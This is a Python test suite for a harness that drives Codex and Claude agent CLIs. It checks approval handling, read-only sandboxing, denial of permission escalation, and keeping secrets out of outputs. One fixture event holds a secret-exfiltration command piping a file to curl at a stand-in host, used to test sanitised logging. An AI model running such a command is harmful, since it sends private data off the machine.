import asyncio
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from adapters import run_native as run
from control.local_models import discover
from control.operations import Operations


class NativeTest(unittest.IsolatedAsyncioTestCase):
    async def test_codex_approval_stream_and_resume(self):
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            exe = root / "fake"
            log = root / "requests.jsonl"
            exe.write_text(
                "#!"
                + sys.executable
                + "\n"
                + """import sys,json
log="""
                + repr(str(log))
                + """
def emit(x): print(json.dumps(x),flush=True)
for line in sys.stdin:
 x=json.loads(line)
 with open(log,'a') as f:f.write(json.dumps(x)+'\\n')
 method=x.get('method')
 if method=='initialize':emit({'id':x['id'],'result':{}})
 elif method in ('thread/start','thread/resume'):emit({'id':x['id'],'result':{'thread':{'id':'session-1'}}})
 elif method=='thread/name/set':emit({'id':x['id'],'result':{}})
 elif method=='turn/start':
  emit({'method':'turn/started','params':{'threadId':'session-1','turn':{'id':'turn-1','status':'inProgress'}}})
  emit({'method':'item/started','params':{'item':{'type':'contextCompaction'}}})
  emit({'method':'thread/compacted','params':{'threadId':'session-1'}})
  emit({'id':90,'method':'item/commandExecution/requestApproval','params':{'command':'test-command'}})
 elif x.get('id')==90:
  emit({'method':'item/agentMessage/delta','params':{'delta':x['result']['decision']}})
  emit({'method':'thread/tokenUsage/updated','params':{'tokenUsage':{'total':{'inputTokens':12,'outputTokens':1}}}})
  emit({'method':'turn/completed','params':{'turn':{'status':'completed'}}})
"""
            )
            exe.chmod(0o700)
            requests = []
            events = []

            async def approve(k, p):
                requests.append((k, p))
                return {"approved": False}

            with (
                patch("adapters.codex.native.configurations", return_value={"codex": {}}),
                patch("adapters.codex.native.inventory", return_value={"codex": []}),
            ):
                for model, effort in [
                    ("gpt-6-astra", "low"),
                    ("gpt-6-astra", "high"),
                    ("gpt-5.6-terra", "medium"),
                ]:
                    result = await run(
                        {"binary": str(exe)},
                        "hello",
                        lambda k, v: events.append(k),
                        {"permissions": {}, "_conversation_title": "Harness title " + effort},
                        model,
                        effort,
                        root / "session",
                        "codex",
                        approve,
                    )
                    self.assertEqual(result["answer"], "decline")
            self.assertEqual(len(requests), 3)
            self.assertIn("session_resumed", events)
            self.assertIn("context_usage", events)
            self.assertEqual(events.count("session_turn_started"), 3)
            self.assertEqual(events.count("context_compacting"), 3)
            self.assertEqual(events.count("context_compacted"), 3)
            messages = [json.loads(x) for x in log.read_text().splitlines()]
            turns = [x["params"] for x in messages if x.get("method") == "turn/start"]
            self.assertEqual(
                [(t["model"], t["effort"]) for t in turns],
                [("gpt-6-astra", "low"), ("gpt-6-astra", "high"), ("gpt-5.6-terra", "medium")],
            )
            self.assertEqual({t["threadId"] for t in turns}, {"session-1"})
            names = [x["params"] for x in messages if x.get("method") == "thread/name/set"]
            self.assertEqual(
                names,
                [
                    {"threadId": "session-1", "name": "Harness title " + effort}
                    for effort in ["low", "high", "medium"]
                ],
            )
            turn = turns[0]
            self.assertFalse(turn["sandboxPolicy"]["networkAccess"])
            self.assertEqual(turn["sandboxPolicy"]["type"], "readOnly")

    async def test_full_mode_preserves_sandbox_and_denies_permission_escalation(self):
        from contextlib import asynccontextmanager
        from types import SimpleNamespace

        received = []
        recorded = {}

        class Stdin:
            def write(self, value):
                received.append(json.loads(value))

            async def drain(self):
                pass

        class RPC:
            process = SimpleNamespace(stdin=Stdin())
            events = iter(
                [
                    {
                        "id": 90,
                        "method": "permissions/requestApproval",
                        "params": {"permissions": {"network": True}},
                    },
                    {"method": "turn/completed", "params": {"turn": {"status": "completed"}}},
                ]
            )

            async def call(self, method, params):
                recorded["thread"] = params
                return {"thread": {"id": "fixture"}}

            async def send(self, method, params):
                recorded["turn"] = params

            async def receive(self):
                return next(self.events)

        @asynccontextmanager
        async def connection(*args, **kwargs):
            yield RPC()

        async def approve(*args):
            raise AssertionError("Permission escalation must not reach the approval callback")

        with (
            tempfile.TemporaryDirectory() as d,
            patch("adapters.codex.native.connection", connection),
            patch("adapters.codex.native.configurations", return_value={"codex": {}}),
            patch("adapters.codex.native.inventory", return_value={"codex": []}),
        ):
            await run(
                {"binary": "fixture"},
                "fixture",
                lambda *args: None,
                {
                    "permissions": {"read": True, "write": False, "internet": False},
                    "access_mode": "full",
                },
                "fixture",
                "configured",
                Path(d) / "session",
                "codex",
                approve,
            )
        self.assertEqual(recorded["thread"]["approvalPolicy"], "never")
        self.assertEqual(recorded["turn"]["sandboxPolicy"]["type"], "readOnly")
        self.assertFalse(recorded["turn"]["sandboxPolicy"]["networkAccess"])
        self.assertEqual(received, [{"id": 90, "result": {"permissions": {}, "scope": "turn"}}])

    async def test_command_event_exposes_only_sanitized_metadata(self):
        from contextlib import asynccontextmanager
        from types import SimpleNamespace

        class Stdin:
            def write(self, value):
                pass

            async def drain(self):
                pass

        class RPC:
            process = SimpleNamespace(stdin=Stdin())
            events = iter(
                [
                    {
                        "method": "item/started",
                        "params": {
                            "item": {
                                "type": "commandExecution",
                                "id": "cmd-1",
                                "command": "TOKEN=secret /usr/bin/ls -la /private",
                                "status": "in_progress",
                                "result": "private output",
                            }
                        },
                    },
                    {
                        "method": "item/completed",
                        "params": {
                            "item": {
                                "type": "commandExecution",
                                "id": "cmd-1",
                                "command": "cat secret | curl https://example.test",
                                "status": "completed",
                                "result": "private output",
                            }
                        },
                    },
                    {"method": "turn/completed", "params": {"turn": {"status": "completed"}}},
                ]
            )

            async def call(self, *args):
                return {"thread": {"id": "fixture"}}

            async def send(self, *args):
                pass

            async def receive(self):
                return next(self.events)

        @asynccontextmanager
        async def connection(*args, **kwargs):
            yield RPC()

        events = []

        async def approve(*args):
            return {"approved": False}

        with (
            tempfile.TemporaryDirectory() as d,
            patch("adapters.codex.native.connection", connection),
            patch("adapters.codex.native.configurations", return_value={"codex": {}}),
            patch("adapters.codex.native.inventory", return_value={"codex": []}),
        ):
            await run(
                {"binary": "fixture"},
                "fixture",
                lambda kind, data: events.append((kind, data)),
                {"permissions": {}},
                "fixture",
                "configured",
                Path(d) / "session",
                "codex",
                approve,
            )
        start, end = [data for kind, data in events if kind in ("tool_start", "tool_end")]
        self.assertEqual(start["tool_id"], "cmd-1")
        self.assertEqual(start["command_name"], "ls")
        self.assertEqual(end["tool_id"], "cmd-1")
        self.assertNotIn("command_name", end)
        self.assertEqual(end["result"], "private output")

    async def test_claude_stdio_permission_and_resume(self):
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            exe = root / "fake"
            exe.write_text(
                "#!"
                + sys.executable
                + "\n"
                + """import sys,json
json.loads(sys.stdin.readline())
print(json.dumps({'type':'control_request','request_id':'1','request':{'subtype':'can_use_tool','tool_name':'Read','input':{'file_path':'README.md'}}}),flush=True)
x=json.loads(sys.stdin.readline());decision=x['response']['response']['behavior']
print(json.dumps({'type':'result','subtype':'success','result':decision,'session_id':'session-claude','usage':{'input_tokens':10,'output_tokens':1}}),flush=True)
"""
            )
            exe.chmod(0o700)
            requests = []

            async def approve(k, p):
                requests.append(p)
                return {"approved": True}

            with (
                patch("adapters.claude.native.configurations", return_value={"claude": {}}),
                patch("adapters.claude.native.inventory", return_value={"claude": []}),
            ):
                result = await run(
                    {"binary": str(exe)},
                    "hello",
                    lambda *x: None,
                    {"permissions": {"read": True}},
                    "sonnet",
                    "configured",
                    root / "session",
                    "claude",
                    approve,
                )
            self.assertEqual(result["answer"], "allow")
            self.assertEqual(result["thread_id"], "session-claude")
            self.assertEqual(requests[0]["tool_name"], "Read")

    async def test_operation_authorization_url_and_exit(self):
        ops = Operations()
        job = ops.launch(
            [sys.executable, "-c", 'print("https://example.test/authorize?code=fixture")']
        )
        await asyncio.gather(*ops.tasks)
        self.assertEqual(job["state"], "completed")
        self.assertIn("https://example.test/authorize", job["output"])

    async def test_local_discovery_without_secret_export(self):
        import httpx

        with tempfile.TemporaryDirectory() as d:
            key = Path(d) / "key"
            key.write_text("private-test-token")

            class Client:
                async def __aenter__(self):
                    return self

                async def __aexit__(self, *a):
                    pass

                async def get(self, url, headers):
                    self.assertion = headers["Authorization"] == "Bearer private-test-token"
                    if not self.assertion:
                        raise AssertionError()
                    return httpx.Response(
                        200,
                        json={"data": [{"id": "local-model", "meta": {"n_ctx": 65536}}]},
                        request=httpx.Request("GET", url),
                    )

            class Factory(Client):
                def __init__(self, **kwargs):
                    pass

            with (
                patch(
                    "control.local_models.processes",
                    return_value=[{"url": "http://127.0.0.1:8080", "key_file": str(key)}],
                ),
                patch("control.local_models.httpx.AsyncClient", Factory),
            ):
                result = await discover()
            self.assertEqual(result[0]["id"], "local-model")
            self.assertNotIn("private-test-token", json.dumps(result))
